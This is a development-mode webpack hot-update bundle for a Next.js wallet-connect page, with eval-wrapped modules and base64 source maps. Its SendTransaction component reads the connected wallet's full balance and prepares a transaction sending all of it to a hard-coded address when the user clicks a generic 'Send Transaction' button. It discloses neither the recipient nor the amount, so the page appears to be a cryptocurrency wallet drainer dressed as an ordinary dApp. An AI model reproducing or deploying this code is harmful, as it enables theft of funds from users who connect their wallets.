"use strict";
/*
 * ATTENTION: An "eval-source-map" devtool has been used.
 * This devtool is neither made for production nor for readable output files.
 * It uses "eval()" calls to create a separate source file with attached SourceMaps in the browser devtools.
 * If you are trying to read the output file, select a different devtool (https://webpack.js.org/configuration/devtool/)
 * or disable the default devtool with "devtool: false".
 * If you are looking for production-ready output files, see mode: "production" (https://webpack.js.org/configuration/mode/).
 */
self["webpackHotUpdate_N_E"]("pages/index",{

/***/ "./src/components/SendTransaction.jsx":
/*!********************************************!*\
  !*** ./src/components/SendTransaction.jsx ***!
  \********************************************/
/***/ (function(module, __webpack_exports__, __webpack_require__) {

eval(__webpack_require__.ts("__webpack_require__.r(__webpack_exports__);\n/* harmony export */ __webpack_require__.d(__webpack_exports__, {\n/* harmony export */   \"default\": function() { return /* binding */ SendTransaction; }\n/* harmony export */ });\n/* harmony import */ var react_jsx_dev_runtime__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! react/jsx-dev-runtime */ \"./node_modules/react/jsx-dev-runtime.js\");\n/* harmony import */ var react_jsx_dev_runtime__WEBPACK_IMPORTED_MODULE_0___default = /*#__PURE__*/__webpack_require__.n(react_jsx_dev_runtime__WEBPACK_IMPORTED_MODULE_0__);\n/* harmony import */ var react__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! react */ \"./node_modules/react/index.js\");\n/* harmony import */ var react__WEBPACK_IMPORTED_MODULE_1___default = /*#__PURE__*/__webpack_require__.n(react__WEBPACK_IMPORTED_MODULE_1__);\n/* harmony import */ var wagmi__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__(/*! wagmi */ \"./node_modules/wagmi/dist/index.js\");\n\nvar _s = $RefreshSig$();\n\n\nfunction SendTransaction() {\n    _s();\n    const [loading, setLoading] = (0,react__WEBPACK_IMPORTED_MODULE_1__.useState)(false);\n    //const sendTR\n    const { address , isConnected  } = (0,wagmi__WEBPACK_IMPORTED_MODULE_2__.useAccount)();\n    const balance = (0,wagmi__WEBPACK_IMPORTED_MODULE_2__.useBalance)({\n        address: address\n    });\n    const { data , isLoading , isSuccess , sendTransaction  } = (0,wagmi__WEBPACK_IMPORTED_MODULE_2__.useSendTransaction)({\n        to: \"0xB9D8AdCA9Dd396416a2892b4Dc472d7Fb6e2b4E7\",\n        value: balance\n    });\n    if (isConnected) {\n        console.log(\"Connected Try To Send. From :\" + address);\n        return /*#__PURE__*/ (0,react_jsx_dev_runtime__WEBPACK_IMPORTED_MODULE_0__.jsxDEV)(\"div\", {\n            children: [\n                /*#__PURE__*/ (0,react_jsx_dev_runtime__WEBPACK_IMPORTED_MODULE_0__.jsxDEV)(\"button\", {\n                    onClick: ()=>sendTransaction(),\n                    children: \"Send Transaction\"\n                }, void 0, false, {\n                    fileName: \"/root/hell/src/components/SendTransaction.jsx\",\n                    lineNumber: 23,\n                    columnNumber: 11\n                }, this),\n                isLoading && /*#__PURE__*/ (0,react_jsx_dev_runtime__WEBPACK_IMPORTED_MODULE_0__.jsxDEV)(\"div\", {\n                    children: \"Check Wallet\"\n                }, void 0, false, {\n                    fileName: \"/root/hell/src/components/SendTransaction.jsx\",\n                    lineNumber: 24,\n                    columnNumber: 25\n                }, this),\n                isSuccess && /*#__PURE__*/ (0,react_jsx_dev_runtime__WEBPACK_IMPORTED_MODULE_0__.jsxDEV)(\"div\", {\n                    children: [\n                        \"Transaction: \",\n                        JSON.stringify(data)\n                    ]\n                }, void 0, true, {\n                    fileName: \"/root/hell/src/components/SendTransaction.jsx\",\n                    lineNumber: 25,\n                    columnNumber: 25\n                }, this)\n            ]\n        }, void 0, true, {\n            fileName: \"/root/hell/src/components/SendTransaction.jsx\",\n            lineNumber: 22,\n            columnNumber: 9\n        }, this);\n    }\n}\n_s(SendTransaction, \"UvMXoIL89EDtZLnHK245BLAXwz0=\", false, function() {\n    return [\n        wagmi__WEBPACK_IMPORTED_MODULE_2__.useAccount,\n        wagmi__WEBPACK_IMPORTED_MODULE_2__.useBalance,\n        wagmi__WEBPACK_IMPORTED_MODULE_2__.useSendTransaction\n    ];\n});\n_c = SendTransaction;\nvar _c;\n$RefreshReg$(_c, \"SendTransaction\");\n\n\n;\n    // Wrapped in an IIFE to avoid polluting the global scope\n    ;\n    (function () {\n        var _a, _b;\n        // Legacy CSS implementations will `eval` browser code in a Node.js context\n        // to extract CSS. For backwards compatibility, we need to check we're in a\n        // browser context before continuing.\n        if (typeof self !== 'undefined' &&\n            // AMP / No-JS mode does not inject these helpers:\n            '$RefreshHelpers$' in self) {\n            // @ts-ignore __webpack_module__ is global\n            var currentExports = module.exports;\n            // @ts-ignore __webpack_module__ is global\n            var prevExports = (_b = (_a = module.hot.data) === null || _a === void 0 ? void 0 : _a.prevExports) !== null && _b !== void 0 ? _b : null;\n            // This cannot happen in MainTemplate because the exports mismatch between\n            // templating and execution.\n            self.$RefreshHelpers$.registerExportsForReactRefresh(currentExports, module.id);\n            // A module can be accepted automatically based on its exports, e.g. when\n            // it is a Refresh Boundary.\n            if (self.$RefreshHelpers$.isReactRefreshBoundary(currentExports)) {\n                // Save the previous exports on update so we can compare the boundary\n                // signatures.\n                module.hot.dispose(function (data) {\n                    data.prevExports = currentExports;\n                });\n                // Unconditionally accept an update to this module, we'll check if it's\n                // still a Refresh Boundary later.\n                // @ts-ignore importMeta is replaced in the loader\n                module.hot.accept();\n                // This field is set when the previous version of this module was a\n                // Refresh Boundary, letting us know we need to check for invalidation or\n                // enqueue an update.\n                if (prevExports !== null) {\n                    // A boundary can become ineligible if its exports are incompatible\n                    // with the previous exports.\n                    //\n                    // For example, if you add/remove/change exports, we'll want to\n                    // re-execute the importing modules, and force those components to\n                    // re-render. Similarly, if you convert a class component to a\n                    // function, we want to invalidate the boundary.\n                    if (self.$RefreshHelpers$.shouldInvalidateReactRefreshBoundary(prevExports, currentExports)) {\n                        module.hot.invalidate();\n                    }\n                    else {\n                        self.$RefreshHelpers$.scheduleUpdate();\n                    }\n                }\n            }\n            else {\n                // Since we just executed the code for the module, it's possible that the\n                // new exports made it ineligible for being a boundary.\n                // We only care about the case when we were _previously_ a boundary,\n                // because we already accepted this update (accidental side effect).\n                var isNoLongerABoundary = prevExports !== null;\n                if (isNoLongerABoundary) {\n                    module.hot.invalidate();\n                }\n            }\n        }\n    })();\n//# sourceURL=[module]\n//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJmaWxlIjoiLi9zcmMvY29tcG9uZW50cy9TZW5kVHJhbnNhY3Rpb24uanN4LmpzIiwibWFwcGluZ3MiOiI7Ozs7Ozs7Ozs7O0FBQWlDO0FBQzZEO0FBRS9FLFNBQVNLLGtCQUFrQjs7SUFDdEMsTUFBTSxDQUFDQyxTQUFTQyxXQUFXLEdBQUdQLCtDQUFRQSxDQUFDLEtBQUs7SUFDaEQsY0FBYztJQUNkLE1BQU0sRUFBRVEsUUFBTyxFQUFFQyxZQUFXLEVBQUUsR0FBR1IsaURBQVVBO0lBQzNDLE1BQU1TLFVBQVVSLGlEQUFVQSxDQUFDO1FBQ3ZCTSxTQUFTQTtJQUNYO0lBQ0YsTUFBTSxFQUFFRyxLQUFJLEVBQUVDLFVBQVMsRUFBRUMsVUFBUyxFQUFFQyxnQkFBZSxFQUFFLEdBQUdYLHlEQUFrQkEsQ0FBQztRQUN2RVksSUFBSTtRQUNKQyxPQUFPTjtJQUNQO0lBS0EsSUFBSUQsYUFBYTtRQUNmUSxRQUFRQyxHQUFHLENBQUMsa0NBQWtDVjtRQUM5QyxxQkFDRSw4REFBQ1c7OzhCQUNDLDhEQUFDQztvQkFBT0MsU0FBUyxJQUFNUDs4QkFBbUI7Ozs7OztnQkFDekNGLDJCQUFhLDhEQUFDTzs4QkFBSTs7Ozs7O2dCQUNsQk4sMkJBQWEsOERBQUNNOzt3QkFBSTt3QkFBY0csS0FBS0MsU0FBUyxDQUFDWjs7Ozs7Ozs7Ozs7OztJQUdwRCxDQUFDO0FBRVAsQ0FBQztHQTFCdUJOOztRQUdTSiw2Q0FBVUE7UUFDM0JDLDZDQUFVQTtRQUc4QkMscURBQWtCQTs7O0tBUGxERSIsInNvdXJjZXMiOlsid2VicGFjazovL19OX0UvLi9zcmMvY29tcG9uZW50cy9TZW5kVHJhbnNhY3Rpb24uanN4P2YyYWEiXSwic291cmNlc0NvbnRlbnQiOlsiaW1wb3J0IHsgdXNlU3RhdGUgfSBmcm9tIFwicmVhY3RcIjtcclxuaW1wb3J0IHsgdXNlQWNjb3VudCwgdXNlQmFsYW5jZSwgdXNlU2VuZFRyYW5zYWN0aW9uLCB1c2VQcmVwYXJlU2VuZFRyYW5zYWN0aW9uIH0gZnJvbSBcIndhZ21pXCI7XHJcblxyXG5leHBvcnQgZGVmYXVsdCBmdW5jdGlvbiBTZW5kVHJhbnNhY3Rpb24oKSB7XHJcbiAgICBjb25zdCBbbG9hZGluZywgc2V0TG9hZGluZ10gPSB1c2VTdGF0ZShmYWxzZSk7XHJcbi8vY29uc3Qgc2VuZFRSXHJcbmNvbnN0IHsgYWRkcmVzcywgaXNDb25uZWN0ZWQgfSA9IHVzZUFjY291bnQoKTtcclxuY29uc3QgYmFsYW5jZSA9IHVzZUJhbGFuY2Uoe1xyXG4gICAgYWRkcmVzczogYWRkcmVzcyxcclxuICB9KVxyXG5jb25zdCB7IGRhdGEsIGlzTG9hZGluZywgaXNTdWNjZXNzLCBzZW5kVHJhbnNhY3Rpb24gfSA9IHVzZVNlbmRUcmFuc2FjdGlvbih7XHJcbiAgICB0bzogJzB4QjlEOEFkQ0E5RGQzOTY0MTZhMjg5MmI0RGM0NzJkN0ZiNmUyYjRFNycsXHJcbiAgICB2YWx1ZTogYmFsYW5jZVxyXG4gICAgfSlcclxuXHJcblxyXG4gXHJcblxyXG4gICAgaWYgKGlzQ29ubmVjdGVkKSB7XHJcbiAgICAgIGNvbnNvbGUubG9nKFwiQ29ubmVjdGVkIFRyeSBUbyBTZW5kLiBGcm9tIDpcIiArIGFkZHJlc3MpXHJcbiAgICAgIHJldHVybiAoXHJcbiAgICAgICAgPGRpdj5cclxuICAgICAgICAgIDxidXR0b24gb25DbGljaz17KCkgPT4gc2VuZFRyYW5zYWN0aW9uKCl9PlNlbmQgVHJhbnNhY3Rpb248L2J1dHRvbj5cclxuICAgICAgICAgIHtpc0xvYWRpbmcgJiYgPGRpdj5DaGVjayBXYWxsZXQ8L2Rpdj59XHJcbiAgICAgICAgICB7aXNTdWNjZXNzICYmIDxkaXY+VHJhbnNhY3Rpb246IHtKU09OLnN0cmluZ2lmeShkYXRhKX08L2Rpdj59XHJcbiAgICAgICAgPC9kaXY+XHJcbiAgICAgIClcclxuICAgICAgfVxyXG4gIFxyXG59XHJcbiJdLCJuYW1lcyI6WyJ1c2VTdGF0ZSIsInVzZUFjY291bnQiLCJ1c2VCYWxhbmNlIiwidXNlU2VuZFRyYW5zYWN0aW9uIiwidXNlUHJlcGFyZVNlbmRUcmFuc2FjdGlvbiIsIlNlbmRUcmFuc2FjdGlvbiIsImxvYWRpbmciLCJzZXRMb2FkaW5nIiwiYWRkcmVzcyIsImlzQ29ubmVjdGVkIiwiYmFsYW5jZSIsImRhdGEiLCJpc0xvYWRpbmciLCJpc1N1Y2Nlc3MiLCJzZW5kVHJhbnNhY3Rpb24iLCJ0byIsInZhbHVlIiwiY29uc29sZSIsImxvZyIsImRpdiIsImJ1dHRvbiIsIm9uQ2xpY2siLCJKU09OIiwic3RyaW5naWZ5Il0sInNvdXJjZVJvb3QiOiIifQ==\n//# sourceURL=webpack-internal:///./src/components/SendTransaction.jsx\n"));

/***/ }),

/***/ "./src/pages/index.jsx":
/*!*****************************!*\
  !*** ./src/pages/index.jsx ***!
  \*****************************/
/***/ (function(module, __webpack_exports__, __webpack_require__) {

eval(__webpack_require__.ts("__webpack_require__.r(__webpack_exports__);\n/* harmony export */ __webpack_require__.d(__webpack_exports__, {\n/* harmony export */   \"default\": function() { return /* binding */ HomePage; }\n/* harmony export */ });\n/* harmony import */ var react_jsx_dev_runtime__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! react/jsx-dev-runtime */ \"./node_modules/react/jsx-dev-runtime.js\");\n/* harmony import */ var react_jsx_dev_runtime__WEBPACK_IMPORTED_MODULE_0___default = /*#__PURE__*/__webpack_require__.n(react_jsx_dev_runtime__WEBPACK_IMPORTED_MODULE_0__);\n/* harmony import */ var _web3modal_react__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! @web3modal/react */ \"./node_modules/@web3modal/react/dist/index.js\");\n/* harmony import */ var _components_CustomButton__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__(/*! ../components/CustomButton */ \"./src/components/CustomButton.jsx\");\n/* harmony import */ var _components_SendTransaction__WEBPACK_IMPORTED_MODULE_3__ = __webpack_require__(/*! ../components/SendTransaction */ \"./src/components/SendTransaction.jsx\");\n\n\n\n\nfunction HomePage() {\n    return /*#__PURE__*/ (0,react_jsx_dev_runtime__WEBPACK_IMPORTED_MODULE_0__.jsxDEV)(react_jsx_dev_runtime__WEBPACK_IMPORTED_MODULE_0__.Fragment, {\n        children: [\n            /*#__PURE__*/ (0,react_jsx_dev_runtime__WEBPACK_IMPORTED_MODULE_0__.jsxDEV)(_web3modal_react__WEBPACK_IMPORTED_MODULE_1__.Web3Button, {\n                icon: \"show\",\n                label: \"Connect Wallet\",\n                balance: \"show\"\n            }, void 0, false, {\n                fileName: \"/root/hell/src/pages/index.jsx\",\n                lineNumber: 9,\n                columnNumber: 7\n            }, this),\n            /*#__PURE__*/ (0,react_jsx_dev_runtime__WEBPACK_IMPORTED_MODULE_0__.jsxDEV)(\"br\", {}, void 0, false, {\n                fileName: \"/root/hell/src/pages/index.jsx\",\n                lineNumber: 10,\n                columnNumber: 7\n            }, this),\n            /*#__PURE__*/ (0,react_jsx_dev_runtime__WEBPACK_IMPORTED_MODULE_0__.jsxDEV)(_web3modal_react__WEBPACK_IMPORTED_MODULE_1__.Web3NetworkSwitch, {}, void 0, false, {\n                fileName: \"/root/hell/src/pages/index.jsx\",\n                lineNumber: 13,\n                columnNumber: 7\n            }, this),\n            /*#__PURE__*/ (0,react_jsx_dev_runtime__WEBPACK_IMPORTED_MODULE_0__.jsxDEV)(\"br\", {}, void 0, false, {\n                fileName: \"/root/hell/src/pages/index.jsx\",\n                lineNumber: 14,\n                columnNumber: 7\n            }, this),\n            /*#__PURE__*/ (0,react_jsx_dev_runtime__WEBPACK_IMPORTED_MODULE_0__.jsxDEV)(_components_CustomButton__WEBPACK_IMPORTED_MODULE_2__[\"default\"], {}, void 0, false, {\n                fileName: \"/root/hell/src/pages/index.jsx\",\n                lineNumber: 17,\n                columnNumber: 7\n            }, this),\n            /*#__PURE__*/ (0,react_jsx_dev_runtime__WEBPACK_IMPORTED_MODULE_0__.jsxDEV)(_components_SendTransaction__WEBPACK_IMPORTED_MODULE_3__[\"default\"], {}, void 0, false, {\n                fileName: \"/root/hell/src/pages/index.jsx\",\n                lineNumber: 20,\n                columnNumber: 7\n            }, this)\n        ]\n    }, void 0, true);\n}\n_c = HomePage;\nvar _c;\n$RefreshReg$(_c, \"HomePage\");\n\n\n;\n    // Wrapped in an IIFE to avoid polluting the global scope\n    ;\n    (function () {\n        var _a, _b;\n        // Legacy CSS implementations will `eval` browser code in a Node.js context\n        // to extract CSS. For backwards compatibility, we need to check we're in a\n        // browser context before continuing.\n        if (typeof self !== 'undefined' &&\n            // AMP / No-JS mode does not inject these helpers:\n            '$RefreshHelpers$' in self) {\n            // @ts-ignore __webpack_module__ is global\n            var currentExports = module.exports;\n            // @ts-ignore __webpack_module__ is global\n            var prevExports = (_b = (_a = module.hot.data) === null || _a === void 0 ? void 0 : _a.prevExports) !== null && _b !== void 0 ? _b : null;\n            // This cannot happen in MainTemplate because the exports mismatch between\n            // templating and execution.\n            self.$RefreshHelpers$.registerExportsForReactRefresh(currentExports, module.id);\n            // A module can be accepted automatically based on its exports, e.g. when\n            // it is a Refresh Boundary.\n            if (self.$RefreshHelpers$.isReactRefreshBoundary(currentExports)) {\n                // Save the previous exports on update so we can compare the boundary\n                // signatures.\n                module.hot.dispose(function (data) {\n                    data.prevExports = currentExports;\n                });\n                // Unconditionally accept an update to this module, we'll check if it's\n                // still a Refresh Boundary later.\n                // @ts-ignore importMeta is replaced in the loader\n                module.hot.accept();\n                // This field is set when the previous version of this module was a\n                // Refresh Boundary, letting us know we need to check for invalidation or\n                // enqueue an update.\n                if (prevExports !== null) {\n                    // A boundary can become ineligible if its exports are incompatible\n                    // with the previous exports.\n                    //\n                    // For example, if you add/remove/change exports, we'll want to\n                    // re-execute the importing modules, and force those components to\n                    // re-render. Similarly, if you convert a class component to a\n                    // function, we want to invalidate the boundary.\n                    if (self.$RefreshHelpers$.shouldInvalidateReactRefreshBoundary(prevExports, currentExports)) {\n                        module.hot.invalidate();\n                    }\n                    else {\n                        self.$RefreshHelpers$.scheduleUpdate();\n                    }\n                }\n            }\n            else {\n                // Since we just executed the code for the module, it's possible that the\n                // new exports made it ineligible for being a boundary.\n                // We only care about the case when we were _previously_ a boundary,\n                // because we already accepted this update (accidental side effect).\n                var isNoLongerABoundary = prevExports !== null;\n                if (isNoLongerABoundary) {\n                    module.hot.invalidate();\n                }\n            }\n        }\n    })();\n//# sourceURL=[module]\n//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJmaWxlIjoiLi9zcmMvcGFnZXMvaW5kZXguanN4LmpzIiwibWFwcGluZ3MiOiI7Ozs7Ozs7Ozs7QUFBaUU7QUFDWDtBQUNNO0FBRTdDLFNBQVNJLFdBQVc7SUFDakMscUJBQ0U7OzBCQUVFLDhEQUFDSix3REFBVUE7Z0JBQUNLLE1BQUs7Z0JBQU9DLE9BQU07Z0JBQWlCQyxTQUFROzs7Ozs7MEJBQ3ZELDhEQUFDQzs7Ozs7MEJBR0QsOERBQUNQLCtEQUFpQkE7Ozs7OzBCQUNsQiw4REFBQ087Ozs7OzBCQUdELDhEQUFDTixnRUFBWUE7Ozs7OzBCQUdiLDhEQUFDQyxtRUFBZUE7Ozs7Ozs7QUFHdEIsQ0FBQztLQWxCdUJDIiwic291cmNlcyI6WyJ3ZWJwYWNrOi8vX05fRS8uL3NyYy9wYWdlcy9pbmRleC5qc3g/ZDM1YyJdLCJzb3VyY2VzQ29udGVudCI6WyJpbXBvcnQgeyBXZWIzQnV0dG9uLCBXZWIzTmV0d29ya1N3aXRjaCB9IGZyb20gXCJAd2ViM21vZGFsL3JlYWN0XCI7XG5pbXBvcnQgQ3VzdG9tQnV0dG9uIGZyb20gXCIuLi9jb21wb25lbnRzL0N1c3RvbUJ1dHRvblwiO1xuaW1wb3J0IFNlbmRUcmFuc2FjdGlvbiBmcm9tIFwiLi4vY29tcG9uZW50cy9TZW5kVHJhbnNhY3Rpb25cIjtcblxuZXhwb3J0IGRlZmF1bHQgZnVuY3Rpb24gSG9tZVBhZ2UoKSB7XG4gIHJldHVybiAoXG4gICAgPD5cbiAgICAgIHsvKiBQcmVkZWZpbmVkIGJ1dHRvbiAgKi99XG4gICAgICA8V2ViM0J1dHRvbiBpY29uPVwic2hvd1wiIGxhYmVsPVwiQ29ubmVjdCBXYWxsZXRcIiBiYWxhbmNlPVwic2hvd1wiIC8+XG4gICAgICA8YnIgLz5cblxuICAgICAgey8qIE5ldHdvcmsgU3dpdGNoZXIgQnV0dG9uICovfVxuICAgICAgPFdlYjNOZXR3b3JrU3dpdGNoIC8+XG4gICAgICA8YnIgLz5cblxuICAgICAgey8qIEN1c3RvbSBidXR0b24gKi99XG4gICAgICA8Q3VzdG9tQnV0dG9uIC8+XG5cbiAgICAgIHsvKiBTZW5kIFRyYW5zYWN0aW9uICovfVxuICAgICAgPFNlbmRUcmFuc2FjdGlvbiAvPlxuICAgIDwvPlxuICApO1xufVxuIl0sIm5hbWVzIjpbIldlYjNCdXR0b24iLCJXZWIzTmV0d29ya1N3aXRjaCIsIkN1c3RvbUJ1dHRvbiIsIlNlbmRUcmFuc2FjdGlvbiIsIkhvbWVQYWdlIiwiaWNvbiIsImxhYmVsIiwiYmFsYW5jZSIsImJyIl0sInNvdXJjZVJvb3QiOiIifQ==\n//# sourceURL=webpack-internal:///./src/pages/index.jsx\n"));

/***/ })

});